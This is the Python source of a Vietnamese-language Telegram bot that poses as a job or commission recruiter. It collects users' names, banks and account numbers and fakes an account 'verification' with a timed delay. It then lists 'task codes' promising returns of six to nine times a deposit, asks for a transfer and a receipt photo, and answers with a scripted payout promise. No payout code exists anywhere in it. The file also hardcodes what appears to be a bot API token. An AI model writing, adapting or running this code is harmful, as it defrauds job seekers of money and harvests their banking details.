import telebot
from telebot import types
import time
import re

# Thay API Token bot của bạn vào đây
API_TOKEN = '8829547891:AAFYdYXpjd2bh_v4txgv2GAq43y5BRR-a1E'  
bot = telebot.TeleBot(API_TOKEN)

# --- THIẾT LẬP MENU NÚT BẤM CHÍNH THỨC CỦA TELEGRAM ---
def setup_bot_commands():
    commands = [
        types.BotCommand("start", "🚀 Khởi động / Đăng ký lại từ đầu"),
        types.BotCommand("task", "📋 Xem danh sách Mã lệnh nhiệm vụ")
    ]
    bot.set_my_commands(commands)

# Lưu trữ dữ liệu người dùng tạm thời
user_data = {}

# Danh sách ngân hàng phổ biến tại Việt Nam
POPULAR_BANKS = [
    "MB Bank", "Vietcombank", "Techcombank", "VietinBank", 
    "BIDV", "Agribank", "ACB", "VPBank", 
    "TPBank", "Sacombank", "VIB", "Khác (Nhập tay)"
]

# --- HÀM TẠO BÀN PHÍM ---

def get_bank_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [types.KeyboardButton(bank) for bank in POPULAR_BANKS]
    markup.add(*buttons)
    btn_back = types.KeyboardButton("⬅️ Quay lại")
    markup.add(btn_back)
    return markup

def get_back_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    markup.add(types.KeyboardButton("⬅️ Quay lại"))
    return markup

def get_task_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [types.KeyboardButton(f"Mã lệnh {i}") for i in range(1, 11)]
    markup.add(*buttons)
    
    btn_back = types.KeyboardButton("⬅️ Quay lại (Sửa STK)")
    btn_reset = types.KeyboardButton("🔄 Nhập lại từ đầu")
    markup.add(btn_back, btn_reset)
    return markup

def get_confirm_transferred_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    btn_done = types.KeyboardButton("✅ Đã chuyển khoản xong")
    markup.add(btn_done)
    return markup


# --- QUÁ TRÌNH ĐĂNG KÝ THÔNG TIN ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    start_registration(message.chat.id)

@bot.message_handler(commands=['task'])
def handle_task_command(message):
    send_task_list(message.chat.id)

def start_registration(chat_id):
    welcome_text = (
        "🙋🏻‍♀️ Xin chào bạn!\n\n"
        "Rất vui được đồng hành và hỗ trợ bạn trong quá trình làm việc. "
        "Mình sẽ là người hướng dẫn, giải đáp các thắc mắc và hỗ trợ bạn hoàn thành nhiệm vụ để nhận hoa hồng mỗi ngày.\n\n"
        "📌 Để hoàn tất hồ sơ nhận thưởng/lương hàng ngày, bạn vui lòng cung cấp đầy đủ thông tin chính xác theo mẫu dưới đây:\n\n"
        "👤 Họ và tên:\n"
        "🏦 Tên ngân hàng:\n"
        "💳 Số tài khoản:\n\n"
        "Vui lòng nhập Họ và tên của bạn (viết hoa chữ cái đầu, ví dụ: Nguyễn Văn A):"
    )
    hide_markup = types.ReplyKeyboardRemove()
    msg = bot.send_message(chat_id, welcome_text, reply_markup=hide_markup)
    bot.register_next_step_handler(msg, process_fullname)

def process_fullname(message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    pattern = r'^[a-zA-ZàáảãạâầấẩẫậăằắẳẵặèéẻẽẹêềếểễệìíỉĩịòóỏõọôồốổỗộơờớởỡợùúủũụưừứửữựỳýỷỹỵĐđ\s]+$'
    words = text.split()
    
    if not re.match(pattern, text) or len(words) < 2:
        msg = bot.send_message(
            chat_id, 
            "❌ Họ và tên không hợp lệ! Vui lòng nhập đầy đủ Họ và Tên (chỉ bao gồm chữ cái, không chứa số/ký tự đặc biệt, ví dụ: Nguyễn Văn A):"
        )
        bot.register_next_step_handler(msg, process_fullname)
        return

    if chat_id not in user_data:
        user_data[chat_id] = {}
    user_data[chat_id]['fullname'] = text.upper()
    
    prompt_bank_selection(chat_id)

def prompt_bank_selection(chat_id):
    msg = bot.send_message(
        chat_id, 
        "Vui lòng chọn Tên ngân hàng của bạn trong danh sách bên dưới (hoặc bấm ⬅️ Quay lại để sửa Họ tên):", 
        reply_markup=get_bank_keyboard()
    )
    bot.register_next_step_handler(msg, process_bank_selection)

def process_bank_selection(message):
    chat_id = message.chat.id
    selected_bank = message.text.strip()
    
    if selected_bank == "⬅️ Quay lại":
        start_registration(chat_id)
        return

    if selected_bank == "Khác (Nhập tay)":
        msg = bot.send_message(
            chat_id, 
            "Vui lòng nhập tên Ngân hàng của bạn:", 
            reply_markup=get_back_keyboard()
        )
        bot.register_next_step_handler(msg, process_custom_bank_name)
        return
    
    if selected_bank not in POPULAR_BANKS:
        msg = bot.send_message(
            chat_id, 
            "⚠️ Vui lòng chọn ngân hàng từ danh sách bên dưới hoặc chọn 'Khác (Nhập tay)':",
            reply_markup=get_bank_keyboard()
        )
        bot.register_next_step_handler(msg, process_bank_selection)
        return

    user_data[chat_id]['bank_name'] = selected_bank.upper()
    prompt_account_no(chat_id)

def process_custom_bank_name(message):
    chat_id = message.chat.id
    bank = message.text.strip()
    
    if bank == "⬅️ Quay lại":
        prompt_bank_selection(chat_id)
        return
    
    pattern = r'^[a-zA-Z0-9àáảãạâầấẩẫậăằắẳẵặèéẻẽẹêềếểễệìíỉĩịòóỏõọôồốổỗộơờớởỡợùúủũụưừứửữựỳýỷỹỵĐđ\s]+$'
    if len(bank) < 2 or not re.match(pattern, bank):
        msg = bot.send_message(
            chat_id, 
            "❌ Tên ngân hàng không hợp lệ! Vui lòng nhập lại tên ngân hàng của bạn:",
            reply_markup=get_back_keyboard()
        )
        bot.register_next_step_handler(msg, process_custom_bank_name)
        return

    user_data[chat_id]['bank_name'] = bank.upper()
    prompt_account_no(chat_id)

def prompt_account_no(chat_id):
    bank_name = user_data[chat_id].get('bank_name', '')
    msg = bot.send_message(
        chat_id, 
        f"✅ Đã chọn ngân hàng: {bank_name}\n\nVui lòng nhập Số tài khoản ngân hàng (chỉ bao gồm chữ số):", 
        reply_markup=get_back_keyboard()
    )
    bot.register_next_step_handler(msg, process_account_no)

def process_account_no(message):
    chat_id = message.chat.id
    account_no = message.text.strip()
    
    if account_no == "⬅️ Quay lại":
        prompt_bank_selection(chat_id)
        return

    if not account_no.isdigit() or not (6 <= len(account_no) <= 19):
        msg = bot.send_message(
            chat_id, 
            "❌ Số tài khoản không hợp lệ! Số tài khoản phải là dãy chữ số từ 6 đến 19 chữ số. Vui lòng nhập lại:",
            reply_markup=get_back_keyboard()
        )
        bot.register_next_step_handler(msg, process_account_no)
        return

    user_data[chat_id]['account_no'] = account_no
    
    fullname = user_data[chat_id]['fullname']
    bank_name = user_data[chat_id]['bank_name']
    
    confirm_text = (
        f"✅ Đã ghi nhận thông tin hồ sơ!\n\n"
        f"👤 Họ tên: {fullname}\n"
        f"🏦 Ngân hàng: {bank_name}\n"
        f"💳 Số tài khoản: {account_no}\n\n"
        f"⏳ Vui lòng chờ 1-2 phút để hệ thống kiểm tra và xác minh thông tin tài khoản của bạn..."
    )
    bot.send_message(chat_id, confirm_text, reply_markup=types.ReplyKeyboardRemove())
    
    time.sleep(3)
    
    verified_text = (
        "✅ Hệ thống đã nhận và xác minh thông tin tài khoản thành công!\n\n"
        "📌 Lưu ý: Nếu phát hiện sai sót thông tin tài khoản ngân hàng, bạn có thể bấm nút '⬅️ Quay lại (Sửa STK)' hoặc '🔄 Nhập lại từ đầu' bên dưới."
    )
    bot.send_message(chat_id, verified_text)
    
    send_task_list(chat_id)

def send_task_list(chat_id):
    task_text = (
        "📢💸 Dưới đây là danh sách các mã lệnh dành cho Nhiệm vụ 1. Quý khách vui lòng tham khảo và lựa chọn mức phù hợp với nhu cầu của mình.\n\n"
        "📌 Nhiệm vụ 1 – Danh sách mã lệnh nhận thưởng trực tiếp:\n\n"
        "• Mã lệnh 1: Nạp 200.000đ → Nhận 1.200.000đ\n"
        "• Mã lệnh 2: Nạp 250.000đ → Nhận 1.500.000đ\n"
        "• Mã lệnh 3: Nạp 350.000đ → Nhận 3.000.000đ\n"
        "• Mã lệnh 4: Nạp 450.000đ → Nhận 3.800.000đ\n"
        "• Mã lệnh 5: Nạp 550.000đ → Nhận 4.600.000đ\n"
        "• Mã lệnh 6: Nạp 650.000đ → Nhận 5.600.000đ\n"
        "• Mã lệnh 7: Nạp 750.000đ → Nhận 6.600.000đ\n"
        "• Mã lệnh 8: Nạp 850.000đ → Nhận 7.600.000đ\n"
        "• Mã lệnh 9: Nạp 950.000đ → Nhận 8.600.000đ\n"
        "• Mã lệnh 10: Nạp 1.000.000đ → Nhận 9.000.000đ\n\n"
        "📌 Ghi chú: Với nhiệm vụ đầu tiên, Quý khách chỉ cần thực hiện nạp tiền và nhận thưởng. Khoản thưởng này là ngân sách được chi ra nhằm mục đích quảng bá và tuyển dụng nhân sự.\n\n"
        "📌 Quý khách vui lòng xem xét và chọn mã lệnh mong muốn thực hiện để chúng tôi hỗ trợ các bước tiếp theo."
    )
    bot.send_message(chat_id, task_text, reply_markup=get_task_keyboard())


# --- XỬ LÝ SỰ KIỆN NÚT BẤM ---

@bot.message_handler(func=lambda message: message.text == "⬅️ Quay lại (Sửa STK)")
def handle_back_to_stk(message):
    prompt_account_no(message.chat.id)

@bot.message_handler(func=lambda message: message.text in ["🔄 Nhập lại từ đầu", "🔄 Nhập lại thông tin tài khoản"])
def handle_reset_info(message):
    bot.send_message(message.chat.id, "🔄 Đã hủy thông tin cũ. Bắt đầu thực hiện nhập lại thông tin mới!")
    start_registration(message.chat.id)

@bot.message_handler(func=lambda message: message.text in [f"Mã lệnh {i}" for i in range(1, 11)])
def handle_code_selection(message):
    selected_code = message.text
    code_number = selected_code.split(" ")[-1]
    image_path = f"malenh{code_number}.jpg"
    
    caption_text = (
        f"✅ BẠN ĐÃ CHỌN {selected_code.upper()}\n"
        f"━━━━━━━━━━━━━━━━━━━\n\n"
        f"📌 HƯỚNG DẪN THANH TOÁN & NẠP TIỀN:\n\n"
        f"1️⃣ Vui lòng chuyển khoản đúng theo thông tin ngân hàng và mã QR đính kèm bên trên.\n\n"
        f"2️⃣ KHÔNG CHỈNH SỬA NỘI DUNG: Giữ nguyên tuyệt đối nội dung chuyển khoản hệ thống cung cấp để được gạch nợ tự động.\n\n"
        f"3️⃣ LƯU LẠI HÓA ĐƠN (BILL): Sau khi giao dịch thành công, vui lòng chụp màn hình hoặc lưu lại bill chuyển khoản.\n\n"
        f"👉 Sau khi hoàn tất và đã có bill, vui lòng bấm nút '✅ Đã chuyển khoản xong' bên dưới để gửi bill xác minh."
    )
    
    markup = get_confirm_transferred_keyboard()
    
    try:
        with open(image_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption=caption_text, reply_markup=markup)
    except FileNotFoundError:
        bot.send_message(message.chat.id, f"⚠️ Lỗi: Không tìm thấy file ảnh `{image_path}` trong thư mục chứa bot!", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "✅ Đã chuyển khoản xong")
def handle_confirm_transfer(message):
    hide_markup = types.ReplyKeyboardRemove()
    request_bill_text = (
        "📸 XÁC NHẬN GIAO DỊCH:\n\n"
        "Vui lòng chụp lại màn hình hóa đơn (Bill giao dịch thành công) và gửi trực tiếp vào khung chat này để hệ thống xác minh và giải ngân tiền thưởng.\n\n"
        "⚠️ LƯU Ý QUAN TRỌNG:\n"
        "• Mọi trường hợp sai nội dung chuyển khoản hoặc chuyển sai số tiền có thể dẫn đến việc chậm trễ giải ngân tiền thưởng.\n"
        "• Ngay khi nhận được bill chuyển khoản, hệ thống sẽ tự động xác minh và tiến hành giải ngân tiền thưởng."
    )
    bot.send_message(message.chat.id, request_bill_text, reply_markup=hide_markup)

@bot.message_handler(content_types=['photo'])
def handle_receipt_photo(message):
    response_text = (
        "📥 Hệ thống đã nhận được hình ảnh hóa đơn chuyển khoản của bạn.\n\n"
        "⏳ Vui lòng chờ từ 5 - 9 phút để hệ thống kiểm tra và thực hiện giải ngân tiền thưởng vào tài khoản ngân hàng của bạn nhé!"
    )
    bot.reply_to(message, response_text)

# Bật khởi tạo Menu Telegram khi khởi chạy Bot
setup_bot_commands()

print("Bot đang chạy...")
bot.infinity_polling()